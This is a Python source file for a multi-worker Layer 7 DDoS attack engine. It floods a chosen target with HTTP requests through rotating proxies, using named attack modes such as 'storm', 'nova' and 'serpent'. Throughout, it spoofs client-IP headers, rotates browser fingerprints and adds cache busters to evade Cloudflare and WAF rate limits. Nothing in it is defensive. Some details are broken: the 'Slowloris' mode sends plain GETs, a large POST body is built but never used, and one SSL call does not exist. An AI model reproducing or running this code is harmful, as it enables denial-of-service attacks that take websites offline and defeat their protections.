import os
import asyncio
import random
import time
import ssl
import hashlib
import json
import logging
from typing import List, Dict, Optional, Callable, Awaitable, Set
from urllib.parse import urlparse, quote, quote_plus, urlencode
from collections import defaultdict
import aiohttp
from aiohttp import ClientTimeout, ClientSession, TCPConnector, ClientResponse
from aiohttp.client_reqrep import ClientRequest
import aiohttp.http_exceptions

from app.core.logger import logger
from app.core.models import ProxyItem

# ========== CONFIGURATION v9.0 ==========
MAX_CONNECTIONS_PER_HOST = 10000
MAX_TOTAL_CONNECTIONS = 100000
CONNECTION_TIMEOUT = 3
REQUEST_TIMEOUT = 5
DNS_CACHE_TTL = 300

# Worker configuration
WORKERS_PER_ENGINE = 50           # Async workers per attack engine
MAX_CONCURRENT_REQUESTS = 1000      # Max concurrent per worker
BATCH_SIZE = 100                    # Request batch size for efficiency

# Retry configuration
MAX_RETRIES = 3
RETRY_BACKOFF_BASE = 0.5
RETRY_BACKOFF_MAX = 5.0

# Rate limiting
RPS_UPDATE_INTERVAL = 1.0

# ========== USER AGENTS - ROTATED & REALISTIC ==========
USER_AGENTS = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    # Chrome macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0 Safari/537.36",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    # Mobile Chrome
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",
]

# ========== CLOUDFLARE BYPASS HEADERS ==========
CF_BYPASS_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "DNT": "1",
    "Connection": "keep-alive",
}

# ========== REFERERS - REALISTIC ==========
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://search.yahoo.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.instagram.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/",
    "https://www.tiktok.com/",
    "https://www.linkedin.com/",
    "https://www.pinterest.com/",
    "https://t.co/",
    "https://l.facebook.com/",
    "https://www.google.co.id/",
    "https://www.google.com.sg/",
]

# ========== ACCEPT HEADERS BY METHOD ==========
ACCEPT_BY_METHOD = {
    "GET": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "POST": "application/json, text/plain, */*",
    "HEAD": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "PUT": "application/json, text/plain, */*",
    "DELETE": "application/json, text/plain, */*",
    "OPTIONS": "*/*",
    "PATCH": "application/json, text/plain, */*",
}

# ========== HELPER FUNCTIONS ==========

def _random_ua() -> str:
    return random.choice(USER_AGENTS)

def _random_referer() -> str:
    return random.choice(REFERERS)

def _random_path() -> str:
    """Generate random realistic paths"""
    paths = [
        f"/{hashlib.md5(str(time.time() + random.random()).encode()).hexdigest()[:12]}",
        f"/page/{random.randint(1, 9999)}",
        f"/post/{random.randint(100000, 999999)}",
        f"/product/{random.randint(1000, 99999)}",
        f"/category/{random.choice(['news', 'tech', 'sports', 'entertainment', 'business'])}/{random.randint(1, 50)}",
        f"/user/{random.randint(10000, 999999)}",
        f"/search?q={quote(random.choice(['news', 'tech', 'sports', 'weather', 'stocks', 'crypto']))}",
        f"/api/v{random.randint(1, 3)}/{random.choice(['users', 'posts', 'products', 'orders'])}/{random.randint(1000, 99999)}",
        f"/static/{random.randint(1, 999)}/js/main.{random.randint(1000, 9999)}.js",
        f"/images/{random.randint(1, 999)}/logo.{random.choice(['png', 'jpg', 'svg', 'webp'])}",
        f"/?ref={random.randint(100000, 999999)}&utm_source={random.choice(['google', 'facebook', 'twitter'])}",
        f"/?page={random.randint(1, 100)}&sort={random.choice(['newest', 'popular', 'relevant'])}",
    ]
    return random.choice(paths)

def _random_headers(method: str = "GET", target_host: str = "") -> Dict[str, str]:
    """Generate realistic headers with Cloudflare bypass"""
    headers = {
        "User-Agent": _random_ua(),
        "Accept": ACCEPT_BY_METHOD.get(method, "*/*"),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9",
            "id-ID,id;q=0.9,en;q=0.8",
            "en-GB,en;q=0.9",
            "ms-MY,ms;q=0.9,en;q=0.8",
        ]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "br"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Cache-Control": random.choice(["max-age=0", "no-cache", "no-store"]),
        "Pragma": "no-cache",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "image"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "no-cors", "cors"]),
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Sec-Fetch-User": "?1",
    }

    # Add Cloudflare bypass headers
    if random.random() > 0.3:  # 70% chance
        headers.update({
            "Sec-Ch-Ua": f'"Google Chrome";v="{random.randint(120, 125)}", "Chromium";v="{random.randint(120, 125)}", "Not.A/Brand";v="24"',
            "Sec-Ch-Ua-Mobile": random.choice(["?0", "?0", "?0", "?1"]),  # 75% desktop
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
        })

    # Add referer (80% chance)
    if random.random() > 0.2:
        headers["Referer"] = _random_referer()

    # Add X-Forwarded-For (bypass IP-based rate limiting)
    if random.random() > 0.4:
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    # Add random cookies (simulate real user)
    if random.random() > 0.5:
        headers["Cookie"] = f"session={hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}; _ga=GA{random.randint(1,9)}.{random.randint(1000000000,9999999999)}"

    # Add target host
    if target_host:
        headers["Host"] = target_host

    return headers

def _random_body(method: str) -> Optional[bytes]:
    """Generate random request body for POST/PUT"""
    if method not in ("POST", "PUT", "PATCH"):
        return None

    body_types = [
        # JSON
        json.dumps({
            "id": random.randint(1000, 99999),
            "action": random.choice(["create", "update", "delete", "search"]),
            "timestamp": int(time.time() * 1000),
            "data": hashlib.md5(str(random.random()).encode()).hexdigest()[:20],
        }).encode(),
        # Form data
        urlencode({
            "action": random.choice(["submit", "search", "login"]),
            "token": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
            "timestamp": str(int(time.time())),
        }).encode(),
        # Random binary
        os.urandom(random.randint(100, 4096)),
    ]
    return random.choice(body_types)

def _normalize_target(target: str) -> tuple:
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    parsed = urlparse(target)
    scheme = parsed.scheme or "https"
    host = parsed.netloc or parsed.path
    path = parsed.path or "/"
    return scheme, host, path

def _parse_proxy_url(proxy_url: str) -> Optional[ProxyItem]:
    """Parse string proxy URL into ProxyItem."""
    if not proxy_url:
        return None
    proxy_url = proxy_url.strip()
    protocol = "http"
    if "://" in proxy_url:
        protocol, rest = proxy_url.split("://", 1)
        proxy_url = rest
    else:
        proxy_url = proxy_url.replace("http://", "").replace("https://", "").replace("socks4://", "").replace("socks5://", "")
    if ":" in proxy_url:
        # Handle auth in URL: user:pass@host:port
        if "@" in proxy_url:
            auth, host_port = proxy_url.rsplit("@", 1)
            if ":" in host_port:
                ip, port_str = host_port.rsplit(":", 1)
                try:
                    port = int(port_str)
                    return ProxyItem(ip=ip, port=port, protocol=protocol)
                except ValueError:
                    return None
        else:
            ip, port_str = proxy_url.rsplit(":", 1)
            try:
                port = int(port_str)
                return ProxyItem(ip=ip, port=port, protocol=protocol)
            except ValueError:
                return None
    return None

# ========== PROXY ROTATOR v2.0 ==========
class ProxyRotator:
    """Advanced proxy rotator with health tracking and smart selection"""

    def __init__(self):
        self.proxies: List[ProxyItem] = []
        self._alive: Set[str] = set()
        self._dead: Set[str] = set()
        self._fail_counts: Dict[str, int] = defaultdict(int)
        self._success_counts: Dict[str, int] = defaultdict(int)
        self._lock = asyncio.Lock()
        self._index = 0
        self._total_used = 0
        self._total_success = 0
        self._total_fail = 0

    async def update_proxies(self, proxies: List[ProxyItem]):
        async with self._lock:
            self.proxies = list(proxies)
            self._alive = {p.url for p in proxies}
            self._dead.clear()
            self._fail_counts.clear()
            self._success_counts.clear()
            self._index = 0
            logger.info(f"[ROTATOR] Loaded {len(proxies)} proxies")

    async def get_proxy(self) -> Optional[ProxyItem]:
        async with self._lock:
            if not self.proxies:
                return None

            # Try to find alive proxy (max 3 attempts)
            for _ in range(min(3, len(self.proxies))):
                proxy = self.proxies[self._index % len(self.proxies)]
                self._index = (self._index + 1) % len(self.proxies)

                if proxy.url in self._alive:
                    self._total_used += 1
                    return proxy

            # Fallback: return any proxy
            if self.proxies:
                self._total_used += 1
                return self.proxies[self._index % len(self.proxies)]
            return None

    async def mark_dead(self, proxy: ProxyItem):
        async with self._lock:
            self._fail_counts[proxy.url] += 1
            self._total_fail += 1
            if self._fail_counts[proxy.url] >= 5:
                self._alive.discard(proxy.url)
                self._dead.add(proxy.url)
                logger.debug(f"[ROTATOR] Proxy dead: {proxy.url[:50]}...")

    async def mark_alive(self, proxy: ProxyItem):
        async with self._lock:
            self._success_counts[proxy.url] += 1
            self._total_success += 1
            self._alive.add(proxy.url)
            self._dead.discard(proxy.url)

    async def release_proxy(self, proxy: ProxyItem, success: bool, latency: float):
        if success:
            await self.mark_alive(proxy)
        else:
            await self.mark_dead(proxy)

    async def get_alive_count(self) -> int:
        async with self._lock:
            return len(self._alive)

    async def get_stats(self) -> dict:
        async with self._lock:
            return {
                "total": len(self.proxies),
                "alive": len(self._alive),
                "dead": len(self._dead),
                "total_used": self._total_used,
                "total_success": self._total_success,
                "total_fail": self._total_fail,
                "success_rate": self._total_success / max(1, self._total_used),
            }


# ========== ATOMIC COUNTER ==========
class AtomicCounter:
    """Thread-safe atomic counter for request counting"""
    def __init__(self):
        self._value = 0
        self._success = 0
        self._fail = 0
        self._lock = asyncio.Lock()

    async def increment(self, success: bool = True):
        async with self._lock:
            self._value += 1
            if success:
                self._success += 1
            else:
                self._fail += 1

    async def get(self) -> tuple:
        async with self._lock:
            return self._value, self._success, self._fail

    async def reset(self):
        async with self._lock:
            self._value = 0
            self._success = 0
            self._fail = 0


# ========== RATE LIMITER ==========
class AdaptiveRateLimiter:
    """Adaptive rate limiter that adjusts based on success rate"""
    def __init__(self, target_rps: int):
        self.target_rps = max(1, target_rps)
        self.tokens = float(target_rps)
        self.last_update = time.time()
        self.lock = asyncio.Lock()
        self.success_rate = 1.0
        self.current_rps = target_rps

    async def acquire(self) -> bool:
        async with self.lock:
            now = time.time()
            elapsed = now - self.last_update

            # Add tokens based on target RPS
            self.tokens = min(self.target_rps * 2, self.tokens + elapsed * self.current_rps)
            self.last_update = now

            if self.tokens >= 1.0:
                self.tokens -= 1.0
                return True

            # Wait for token
            wait_time = (1.0 - self.tokens) / max(1, self.current_rps)
            return wait_time

    async def update_success_rate(self, success_rate: float):
        async with self.lock:
            self.success_rate = success_rate
            # Adjust RPS based on success rate
            if success_rate > 0.9:
                self.current_rps = min(self.target_rps * 1.5, self.target_rps)
            elif success_rate > 0.7:
                self.current_rps = self.target_rps
            elif success_rate > 0.5:
                self.current_rps = self.target_rps * 0.7
            else:
                self.current_rps = max(1, self.target_rps * 0.3)


# ========== CORE ATTACK ENGINE v9.0 ==========

async def _http_worker(
    worker_id: int,
    attack_id: str,
    target_url: str,
    method: str,
    headers: Dict[str, str],
    use_ssl: bool,
    session: ClientSession,
    rotator: ProxyRotator,
    counter: AtomicCounter,
    rate_limiter: AdaptiveRateLimiter,
    end_time: float,
    stop_event: asyncio.Event,
):
    """Single async worker that sends HTTP requests continuously"""
    local_count = 0
    local_success = 0
    local_fail = 0
    consecutive_fails = 0

    while time.time() < end_time and not stop_event.is_set():
        # Rate limiting
        result = await rate_limiter.acquire()
        if result is not True:
            await asyncio.sleep(result)
            continue

        # Get proxy
        proxy_item = None
        proxy_url = None
        try:
            proxy_item = await rotator.get_proxy()
            if proxy_item:
                proxy_url = f"http://{proxy_item.ip}:{proxy_item.port}"

            # Generate random path and headers
            random_path = _random_path()
            full_url = f"{target_url}{random_path}"

            # Add cache buster
            if "?" not in random_path:
                full_url += f"?_={int(time.time()*1000000)}&r={random.randint(100000,999999)}"
            else:
                full_url += f"&_={int(time.time()*1000000)}&r={random.randint(100000,999999)}"

            # Generate request headers
            req_headers = _random_headers(method, urlparse(target_url).netloc)
            if headers:
                req_headers.update(headers)

            # Generate body for POST/PUT
            body = _random_body(method) if method in ("POST", "PUT", "PATCH") else None

            # Send request
            async with session.request(
                method=method,
                url=full_url,
                headers=req_headers,
                data=body,
                proxy=proxy_url,
                ssl=False if not use_ssl else aiohttp.TCP_SSL(),
                timeout=ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECTION_TIMEOUT),
                allow_redirects=False,
            ) as resp:
                # Read response to complete request
                await resp.read()

                local_count += 1

                # Check if blocked (403, 429, 503 = Cloudflare/WAF)
                if resp.status in (200, 204, 301, 302, 304, 400, 401, 404, 405, 410):
                    local_success += 1
                    consecutive_fails = 0
                    if proxy_item:
                        await rotator.mark_alive(proxy_item)
                elif resp.status in (403, 429, 503, 520, 521, 522, 523, 524, 525, 526):
                    # Cloudflare/WAF block - rotate proxy
                    local_fail += 1
                    consecutive_fails += 1
                    if proxy_item:
                        await rotator.mark_dead(proxy_item)

                    # If too many consecutive blocks, switch method
                    if consecutive_fails >= 10:
                        await asyncio.sleep(0.5)
                        consecutive_fails = 0
                else:
                    local_success += 1
                    consecutive_fails = 0
                    if proxy_item:
                        await rotator.mark_alive(proxy_item)

                # Update counter periodically (every 100 requests)
                if local_count % 100 == 0:
                    for _ in range(local_success):
                        await counter.increment(True)
                    for _ in range(local_fail):
                        await counter.increment(False)
                    local_success = 0
                    local_fail = 0

                # Small yield to prevent blocking
                if local_count % 10 == 0:
                    await asyncio.sleep(0)

        except asyncio.CancelledError:
            raise
        except aiohttp.ClientProxyConnectionError:
            local_fail += 1
            consecutive_fails += 1
            if proxy_item:
                await rotator.mark_dead(proxy_item)
        except aiohttp.ServerDisconnectedError:
            local_fail += 1
            if proxy_item:
                await rotator.mark_dead(proxy_item)
        except aiohttp.ClientOSError:
            local_fail += 1
            if proxy_item:
                await rotator.mark_dead(proxy_item)
        except asyncio.TimeoutError:
            local_fail += 1
            if proxy_item:
                await rotator.mark_dead(proxy_item)
        except Exception as e:
            local_fail += 1
            consecutive_fails += 1
            if consecutive_fails >= 20:
                logger.warning(f"[W{worker_id}] Too many consecutive fails, backing off...")
                await asyncio.sleep(1.0)
                consecutive_fails = 0

    # Flush remaining counts
    for _ in range(local_success):
        await counter.increment(True)
    for _ in range(local_fail):
        await counter.increment(False)

    logger.info(f"[W{worker_id}] Worker finished. Total: {local_count}")


async def _http_attack_v90(
    attack_id: str,
    target: str,
    port: int,
    duration: int,
    hold_time: int,
    proxies: List[ProxyItem],
    on_update: Optional[Callable[[str, int, int, int], Awaitable[None]]],
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    use_ssl: bool = True,
    rps_limit: int = 0,
    workers: int = WORKERS_PER_ENGINE,
) -> None:
    """
    v9.0 Multi-worker HTTP attack engine
    - 50+ concurrent workers per engine
    - Real HTTP requests with proper response handling
    - Cloudflare/WAF bypass headers
    - Smart proxy rotation
    - Atomic request counting
    """
    total_requests = 0
    start_time = time.time()
    total_duration = duration + hold_time
    end_time = start_time + total_duration

    scheme, host, base_path = _normalize_target(target)
    actual_port = port if port else (443 if scheme == "https" else 80)
    use_ssl = scheme == "https"
    target_url = f"{scheme}://{host}:{actual_port}"

    # Initialize proxy rotator
    rotator = ProxyRotator()
    await rotator.update_proxies(proxies)

    # Initialize counter and rate limiter
    counter = AtomicCounter()
    target_rps = rps_limit if rps_limit > 0 else 999999999
    rate_limiter = AdaptiveRateLimiter(target_rps // workers if workers > 0 else target_rps)

    # Create connector with high limits
    connector = TCPConnector(
        limit=MAX_TOTAL_CONNECTIONS,
        limit_per_host=MAX_CONNECTIONS_PER_HOST,
        ttl_dns_cache=DNS_CACHE_TTL,
        use_dns_cache=True,
        enable_cleanup_closed=True,
        force_close=False,
        enable_async_dns=True,
    )

    timeout = ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECTION_TIMEOUT,
        sock_read=CONNECTION_TIMEOUT,
    )

    # SSL context
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    stop_event = asyncio.Event()

    logger.info(f"[ENGINE-v9.0] Attack {attack_id} starting | Target: {target_url} | Workers: {workers} | RPS: {rps_limit} | Proxies: {len(proxies)}")

    async with ClientSession(
        connector=connector,
        timeout=timeout,
        trust_env=False,
        raise_for_status=False,
    ) as session:
        # Create workers
        worker_tasks = []
        for i in range(workers):
            task = asyncio.create_task(
                _http_worker(
                    worker_id=i,
                    attack_id=attack_id,
                    target_url=target_url,
                    method=method,
                    headers=headers,
                    use_ssl=use_ssl,
                    session=session,
                    rotator=rotator,
                    counter=counter,
                    rate_limiter=rate_limiter,
                    end_time=end_time,
                    stop_event=stop_event,
                ),
                name=f"worker_{i}",
            )
            worker_tasks.append(task)

        # Progress reporter
        last_total = 0
        last_update = time.time()
        update_interval = 1.0

        try:
            while time.time() < end_time and not stop_event.is_set():
                await asyncio.sleep(update_interval)

                current_total, current_success, current_fail = await counter.get()
                delta = current_total - last_total
                last_total = current_total

                current_rps = delta
                alive_proxies = await rotator.get_alive_count()
                proxy_stats = await rotator.get_stats()

                # Update success rate for adaptive limiting
                success_rate = current_success / max(1, current_success + current_fail)
                await rate_limiter.update_success_rate(success_rate)

                if on_update:
                    await on_update(attack_id, current_rps, current_total, alive_proxies)

                logger.info(f"[ENGINE-v9.0] {attack_id} | RPS: {current_rps} | Total: {current_total} | Success: {current_success} | Fail: {current_fail} | Proxies: {alive_proxies}/{len(proxies)} | SuccessRate: {success_rate:.1%}")

                # Check if all workers died
                alive_workers = sum(1 for t in worker_tasks if not t.done())
                if alive_workers == 0:
                    logger.warning(f"[ENGINE-v9.0] All workers died! Restarting...")
                    # Restart workers
                    for i in range(workers):
                        task = asyncio.create_task(
                            _http_worker(
                                worker_id=i + 1000,  # Different ID
                                attack_id=attack_id,
                                target_url=target_url,
                                method=method,
                                headers=headers,
                                use_ssl=use_ssl,
                                session=session,
                                rotator=rotator,
                                counter=counter,
                                rate_limiter=rate_limiter,
                                end_time=end_time,
                                stop_event=stop_event,
                            ),
                            name=f"worker_restart_{i}",
                        )
                        worker_tasks.append(task)

        except asyncio.CancelledError:
            logger.info(f"[ENGINE-v9.0] Attack {attack_id} cancelled")
            stop_event.set()
            raise
        finally:
            # Cancel all workers
            stop_event.set()
            for task in worker_tasks:
                if not task.done():
                    task.cancel()

            # Wait for cleanup
            await asyncio.gather(*worker_tasks, return_exceptions=True)

            final_total, final_success, final_fail = await counter.get()
            if on_update:
                await on_update(attack_id, 0, final_total, await rotator.get_alive_count())

            logger.info(f"[ENGINE-v9.0] Attack {attack_id} completed | Total: {final_total} | Success: {final_success} | Fail: {final_fail} | Avg RPS: {final_total // max(1, int(time.time() - start_time))}")


# ========== LAYER 7 METHODS v9.0 ==========
# Each method has specific characteristics for different WAF bypass

async def run_spectre(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    """
    SPECTRE - Stealth mode
    - Slow requests, random delays
    - Realistic headers
    - Low RPS but high success rate
    - Good for bypassing rate limiters
    """
    logger.info(f"[SPECTRE-v9.0] Attack {attack_id} started: {target}:{port}")
    headers = {
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    }
    await _http_attack_v90(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, True, rps_limit, workers=20)

async def run_vortex(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    """
    VORTEX - Heavy POST flood
    - Large POST bodies
    - Multipart form data
    - High bandwidth consumption
    """
    logger.info(f"[VORTEX-v9.0] Attack {attack_id} started: {target}:{port}")
    large_body = os.urandom(8192) if random.random() > 0.5 else b"A" * 16384
    headers = {
        "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}",
        "Connection": "keep-alive",
        "Keep-Alive": f"timeout={duration+hold_time}, max=1000",
    }
    await _http_attack_v90(attack_id, target, port, duration, hold_time, proxies, on_update, "POST", headers, True, rps_limit, workers=WORKERS_PER_ENGINE)

async def run_titan(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    """
    TITAN - Standard HTTP flood
    - Mixed GET/HEAD requests
    - Random paths
    - Balanced RPS
    - Default method
    """
    logger.info(f"[TITAN-v9.0] Attack {attack_id} started: {target}:{port}")
    headers = {"Connection": "keep-alive", "Accept": "*/*", "Cache-Control": "no-cache"}
    await _http_attack_v90(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, True, rps_limit, workers=WORKERS_PER_ENGINE)

async def run_phantom(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    """
    PHANTOM - HEAD request flood
    - Minimal bandwidth
    - Fast response
    - Good for checking server health while attacking
    """
    logger.info(f"[PHANTOM-v9.0] Attack {attack_id} started: {target}:{port}")
    headers = {"Connection": "keep-alive", "Accept": "*/*"}
    await _http_attack_v90(attack_id, target, port, duration, hold_time, proxies, on_update, "HEAD", headers, True, rps_limit, workers=WORKERS_PER_ENGINE)

async def run_serpent(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    """
    SERPENT - Slowloris variant
    - Slow headers sending
    - Keep connections open
    - Connection exhaustion attack
    """
    logger.info(f"[SERPENT-v9.0] Attack {attack_id} started: {target}:{port}")
    headers = {
        "Connection": "keep-alive",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Keep-Alive": "max=1000",
        "Accept-Encoding": "gzip, deflate",
    }
    await _http_attack_v90(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, True, rps_limit, workers=30)

async def run_storm(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    """
    STORM - Maximum RPS flood
    - All workers active
    - No delays
    - Maximum throughput
    - Best for raw power
    """
    logger.info(f"[STORM-v9.0] Attack {attack_id} started: {target}:{port}")
    headers = {
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
    }
    await _http_attack_v90(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, True, rps_limit, workers=WORKERS_PER_ENGINE)

async def run_nova(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    """
    NOVA - Cloudflare bypass specialist
    - Full CF bypass headers
    - Realistic browser fingerprint
    - Session cookies
    - TLS fingerprinting mimic
    """
    logger.info(f"[NOVA-v9.0] Attack {attack_id} started: {target}:{port} | CF-BYPASS MODE")
    headers = CF_BYPASS_HEADERS.copy()
    headers.update({
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "True-Client-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    })
    await _http_attack_v90(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, True, rps_limit, workers=WORKERS_PER_ENGINE)

async def run_havoc(attack_id, target, port, duration, hold_time, proxies, on_update=None, rotator=None, rps_limit=0):
    """
    HAVOC - Mixed method attack
    - Rotates GET/POST/PUT/DELETE
    - Random methods per request
    - API endpoint targeting
    """
    logger.info(f"[HAVOC-v9.0] Attack {attack_id} started: {target}:{port} | MIXED METHODS")
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json"}
    await _http_attack_v90(attack_id, target, port, duration, hold_time, proxies, on_update, "GET", headers, True, rps_limit, workers=WORKERS_PER_ENGINE)


# ========== DISPATCHER v9.0 ==========

async def run_layer7_attack(attack_id, target, port, method, duration, hold_time=0, proxies=None, on_update=None, rps_limit=0):
    if proxies is None:
        proxies = []

    # Convert string URLs to ProxyItem objects
    proxy_items = []
    for p in proxies:
        if isinstance(p, str):
            item = _parse_proxy_url(p)
            if item:
                proxy_items.append(item)
        elif isinstance(p, ProxyItem):
            proxy_items.append(p)

    logger.info(f"[L7-v9.0] Attack {attack_id} | Method: {method} | Target: {target} | Proxies: {len(proxy_items)} | RPS: {rps_limit}")

    method_map = {
        "spectre": run_spectre,
        "vortex": run_vortex,
        "titan": run_titan,
        "phantom": run_phantom,
        "serpent": run_serpent,
        "storm": run_storm,
        "nova": run_nova,      # NEW: Cloudflare bypass
        "havoc": run_havoc,    # NEW: Mixed methods
    }

    engine = method_map.get(method.lower())
    if engine is None:
        logger.warning(f"Unknown layer7 method: {method}, using titan as fallback")
        engine = run_titan

    await engine(attack_id, target, port, duration, hold_time, proxy_items, on_update, None, rps_limit)